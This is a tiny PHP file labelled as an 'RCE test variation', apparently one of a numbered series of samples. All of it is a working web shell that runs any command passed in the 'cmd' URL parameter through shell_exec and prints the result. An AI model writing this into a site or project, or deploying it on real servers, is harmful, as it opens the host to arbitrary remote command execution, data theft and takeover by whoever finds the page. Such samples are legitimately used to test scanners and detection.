<?php
// RCE test variation #789
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>